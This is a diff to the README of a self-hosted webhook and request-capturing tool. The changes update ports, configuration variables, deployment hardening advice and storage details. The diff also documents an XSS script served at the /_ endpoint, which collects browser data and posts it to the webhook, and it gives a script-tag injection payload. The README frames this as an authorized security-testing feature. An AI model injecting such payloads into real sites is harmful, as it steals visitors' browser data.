@@ -58,7 +58,7 @@ cp .env.example .env
 2. Now you can build and start your containers with:
 
 ```bash
-docker-compose up --build -d
+docker compose up --build -d
 ```
 
 #### Access the Webhook
@@ -66,7 +66,7 @@ docker-compose up --build -d
 Once the containers are running, you can access your webhook on:
 
 ```
-http://localhost:8000
+http://localhost:8080
 ```
 
 The server will now be accepting requests on the specified port (8000 by default).
@@ -86,47 +86,52 @@ The dashboard will allow you to view all requests.
 The following environment variables are available for customization:
 
 - **LOG_LEVEL**: Log level for the application. Options are `debug`, `info`, `warn`, `error`. Defaults to `info`.
-- **WEBHOOK_PORT**: Port for the webhook server. Defaults to `8000`.
+- **WEBHOOK_PORT**: Host port for the webhook server. The example environment uses `8080`.
 - **DASHBOARD_PORT**: Port for the dashboard server. Defaults to `3000`.
-- **SECRET_KEY**: Secret key for the application. Set this to a secure value.
+- **SECRET_KEY**: Dashboard session signing key. It must contain at least 32 characters.
 - **REDIS_ADDR**: Address of the Redis server. Defaults to `redis` (for Docker) or `localhost`.
 - **REDIS_PORT**: Port for the Redis server. Defaults to `6379`.
 - **REDIS_PASSWORD**: Password for the Redis server. Set this to a secure value.
-- **REDIS_URL**: Full Redis connection URL. Example: `redis://:secure_password@redis:6379/0`
 - **USER_ID**: User ID for the frontend/dashboard. Defaults to `0`.
-- **USER_NAME**: Username for the frontend/dashboard. Defaults to `akiidjk`.
-- **USER_PASSWORD**: Password for the frontend/dashboard. Set this to a secure value.
+- **USER_NAME**: Required username for the frontend/dashboard.
+- **USER_PASSWORD**: Password for the frontend/dashboard. There is no default.
+- **WEBHOOK_PUBLIC_URL**: Public webhook origin used by the optional XSS report script.
+- **TRUST_PROXY**: Set to `true` only when a trusted reverse proxy overwrites `X-Forwarded-For`.
+
+For an Internet-facing deployment, terminate HTTPS at a reverse proxy and use separate hostnames for the dashboard and webhook. Browser cookies are scoped by hostname, not port, so running both services on one hostname can send dashboard cookies to the request-capturing service.
 
 ### 🔍 Health Check
 
-A background goroutine regularly pings Redis to ensure availability, reporting status via an internal channel. The check interval is configurable.
+The application health endpoints ping Redis. Compose waits for an authenticated Redis health check before starting the applications.
 
 ### 📁 Log Storage
 
-The application saves all logs to a folder on your host machine. The logs are stored in the `./adh-webhook/logs` directory on your host system, ensuring that the logs persist even when the container is restarted or destroyed. This is done via Docker bind mounts, which map the `./adh-webhook/logs` folder on your local machine to `/tmp/webhook` in the container.
+Webhook logs are stored in the `webhook_logs` Docker volume and written to standard output. Request documents expire after seven days. The live Redis stream retains approximately the latest 10,000 event identifiers.
 
 ### 🧪  Example Request
 
 Try sending a POST request:
 
 ```bash
-curl -X POST http://localhost:8000 -H "Content-Type: application/json" -d '{"key":"value"}'
+curl -X POST http://localhost:8080 -H "Content-Type: application/json" -d '{"key":"value"}'
 ```
 
 ### 🐛  XSS Script
 
-Available at the /_ endpoint, Adh serves a JavaScript snippet (inspired by xss.report) that exfiltrates data via a request to your server.
+Available at the `/_` endpoint, Adh serves a JavaScript snippet that collects browser data and posts it to `WEBHOOK_PUBLIC_URL`. This is a dual-use security-testing feature. Only deploy it where you have authorization to collect that data.
 
 Example payload:
 
 ```js
-<script src="http://localhost:8000/_"></script>
+<script src="http://localhost:8080/_"></script>
 ```
 
 Customize the domain in the script if running Adh on a different host.
 
 > [!TIP]
 > Now you can also create CUSTOM pages, go to `/creator` to create your own page!
+
+Custom page previews execute scripts in a sandboxed iframe. Those scripts cannot access the dashboard document, but they can still make outbound network requests.
 
 
 ### 📌 To-Do
